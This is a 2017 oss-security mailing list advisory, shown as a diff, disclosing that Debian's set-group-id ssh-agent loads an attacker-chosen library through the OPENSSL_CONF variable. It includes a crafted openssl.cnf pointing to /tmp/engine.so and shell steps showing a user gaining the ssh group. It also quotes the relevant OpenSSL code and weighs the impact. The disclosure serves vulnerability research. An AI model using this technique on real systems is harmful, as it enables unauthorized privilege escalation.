@@ -1,0 +1,251 @@
+
+Date: Mon, 25 Dec 2017 12:01:13 +0000
+From: halfdog <me@...fdog.net>
+To: oss-security@...ts.openwall.com
+Subject: Gain Access to SSH Group via ssh-agent and OpenSSL
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA512
+
+Hello List,
+
+This seems to be just a funny bug and no security problem, as
+discussed on open[ssh/ssl]-security. As the sum of knowledge held
+by a community is more than the parts, public should allow search
+for better solution, thus avoiding an implementation with side
+affectects causing more severe troubles in future. Read more at
+
+http://www.halfdog.net/Security/2017/SshAgentGainGroupPrivileges/
+
+hd
+
+
+<-- Created by SecurityReportToText.xsl V20121225 -->
+
+Gain Access to SSH Group via ssh-agent and OpenSSL
+==================================================
+
+=== Introduction ===
+
+
+= Problem description: =: On Debian, /ssh-agent/ is a set-group-id
+binary with a nice feature to gain access to that group and execute
+arbitrary code via included openssl library. Usually that would
+be quite a bad security vulnerability, but at least for ssh-agent,
+this is just a funny bug or unexpected behaviour. According to
+man-pages:
+
+************************************************************
+ssh-agent is a program to hold private keys used for public key
+authentication (RSA, DSA, ECDSA, Ed25519). ssh-agent is usually
+started in the beginning of an X-session or a login session, and
+all other windows or programs are started as clients to the ssh-agent
+program. Through use of environment variables the agent can be
+located and automatically used for authentication when logging
+in to other machines using ssh(1).
+************************************************************
+
+
+The reason for ssh-agent being a SGID binary is also given
+in the man pages:
+
+************************************************************
+In Debian, ssh-agent is installed with the set-group-id bit set,
+to prevent ptrace(2) attacks retrieving private key material....
+************************************************************
+
+
+As ssh-agent is handling private key material, it uses the
+/libcrypto.so/ from /libssl/ package for cryptography
+related operations. To support integration of non-standard ciphers
+or cryptohardware, openssl is very flexible regarding its configuration.
+- From the /openssl (1)/ man page:
+
+************************************************************
+Many commands use an external configuration file for some or all
+of their arguments and have a -config option to specify that file.
+The environment variable OPENSSL_CONF can be used to specify the
+location of the file. If the environment variable is not specified,
+then the file is named openssl.cnf in the default certificate
+storage area ...
+************************************************************
+
+
+Most interesting feature of the configuration is, that it supports
+loading of shared libraries from non-standard locations using
+the /dynamic_path/ configuration setting.
+
+
+=== Methods ===
+
+
+To elevate privileges, mahe ssh-agent use a crafted openssl
+configuration via the /OPENSSL_CONF/ environment variable
+and let it point to a file containing library loading instructions,
+e.g. "load.conf" [idm38]:
+
+************************************************************
+# See http://www.halfdog.net/Security/2017/SshAgentGainGroupPrivileges/
+# Copyright (c) 2017 halfdog <me (%) halfdog.net>
+openssl_conf = openssl_def
+
+[openssl_def]
+engines = engine_section
+
+[engine_section]
+pkcs11 = pkcs11_section
+
+[pkcs11_section]
+engine_id = pkcs11
+dynamic_path = /tmp/engine.so
+default_algorithms = ALL
+init = 1
+************************************************************
+
+
+The /engine.so/ is a standard shared object, that will
+be loaded using /dlopen/ when the SSL engine is initialized.
+"engine.c" [idm43] will just change /gid/ to
+/egid/ and run //bin/sh/.
+
+************************************************************
+$ gcc -Wall -fPIC -c engine.c
+$ id
+uid=1000(test) gid=100(users) groups=100(users)
+$ ld -shared -Bdynamic engine.o -L/lib -lc -o engine.so
+$ cp engine.so load.conf /tmp
+$ OPENSSL_CONF=/tmp/load.conf /usr/bin/ssh-agent
+TestLib.c: Within _init
+Process uid/gid at load: 1000/1000/1000 100/100/112
+Process uid/gid after change: 1000/1000/1000 112/112/112
+$ id
+uid=1000(test) gid=112(ssh) groups=112(ssh),100(users)
+************************************************************
+
+
+
+
+=== Results, Discussion ===
+
+
+= Openssl code: =: Openssl openssl-1.1.0
+contains some code intended to protect against such attacks, see
+/crypto/uid.c/:
+
+************************************************************
+int OPENSSL_issetugid(void)
+{
+    if (getuid() != geteuid())
+        return 1;
+    if (getgid() != getegid())
+        return 1;
+    return 0;
+}
+************************************************************
+
+
+But this code is only active to disallow gaining randomness
+from weak sources in SUID-binaries, see /crypto/rand/randfile.c/:
+
+************************************************************
+    if (OPENSSL_issetugid() != 0) {
+        use_randfile = 0;
+    } else {
+        s = getenv("RANDFILE");
+        if (s == NULL || *s == '\0') {
+            use_randfile = 0;
+            s = getenv("HOME");
+        }
+    }
+************************************************************
+
+
+In /char *CONF_get1_default_config_file(void)/ plain getenv()
+is used:
+
+************************************************************
+char *CONF_get1_default_config_file(void)
+{
+    char *file;
+    int len;
+
+    file = getenv("OPENSSL_CONF");
+    if (file)
+        return OPENSSL_strdup(file);
+...
+************************************************************
+
+= Impact on Debian/ssh-agent: =: Here the impact is very limited: the SGID
+binary is just here to avoid ptracing for key extraction. With
+standard settings, even after gaining access to the group, the
+process will still not be able to read the memory content of an
+running ssh-agent.
+
+
+= Impact on Debian/ssh-keysign: =: The binary //usr/lib/openssh/ssh-keysign/
+is a SUID binary, but does not access the configuration environment
+variable, thus no local-root-privilege escalation is possible.
+The reason for that is not fully analyzed yet.
+
+
+= Impact in general: =: The openssl engine loading allows to inject
+arbitrary libraries during SSL engine initialization and therefore
+might come in handy bypassing security restrictions in general
+or to backdoor security software in specific.
+
+
+= Other SSL implementations: =: At the moment, it is not known, if other
+SSL libraries have copied the environment-configuration pattern
+or have similar vulnerabilities not related to code duplication.
+At the moment one implementation is already confirmed to have
+anticipated the risks of environment variable use beforehand.
+_Not affected:_
+
+* _libressl_: Code was removed, see comments from "libressl lead developer Theo de Raadt" [idm78], info on "commits" [idm79]
+
+
+=== Open Questions ===
+
+
+Theo de Raadt also pointed out:
+/I think older versions of openssl didn't inspect that environment
+variable during a constructor, but only in active code.  So
+applications could clean the environment space themselves.
+I'm wondering if some systems run with openssl which doesn't take
+the constructor approach.../
+Maybe this is related to the reason why /ssh-agent/ is affected
+but /ssh-keysign/ is not.
+
+
+=== Timeline ===
+
+
+
+* 20170608: Discovery
+* 20171217: Report to openssh/openssl security
+* 20171225: Opening of public discussion
+
+
+=== Material, References ===
+
+
+
+* My recommendations for a fix as "mail" [idm101]
+
+>>> Last modified 20171225
+Contact e-mail: me (%) halfdog.net <<<
+
+* [idm38] http://www.halfdog.net/Security/2017/SshAgentGainGroupPrivileges/load.conf
+* [idm43] http://www.halfdog.net/Security/2017/SshAgentGainGroupPrivileges/engine.c
+* [idm48] http://www.halfdog.net/Security/2017/SshAgentGainGroupPrivileges/engine.c
+* [idm78] http://www.halfdog.net/Security/2017/SshAgentGainGroupPrivileges/20171217-TheoDeRaadt-RePrivilegeEscalationToGroupSshInSshAgentViaOpensslLibrary.eml
+* [idm79] http://www.halfdog.net/Security/2017/SshAgentGainGroupPrivileges/20171219-TheoDeRaadt-LibresslCommitsAroundGetenv.eml
+* [idm101] http://www.halfdog.net/Security/2017/SshAgentGainGroupPrivileges/201712192246-MailToOpenSshSslLists-RecommendationsForFix.eml
+-----BEGIN PGP SIGNATURE-----
+
+iF0EAREKAB0WIQQVaq6YuR8BFP6IK9jEWZOG/u2r7gUCWkDb5QAKCRDEWZOG/u2r
+7n1mAJ4mnA5ze2v0i9Q+plzicIm0mgzP3QCfbfbzmK5ilojqO1PtXbALiVWbFWM=
+=Yui+
+-----END PGP SIGNATURE-----
+
+
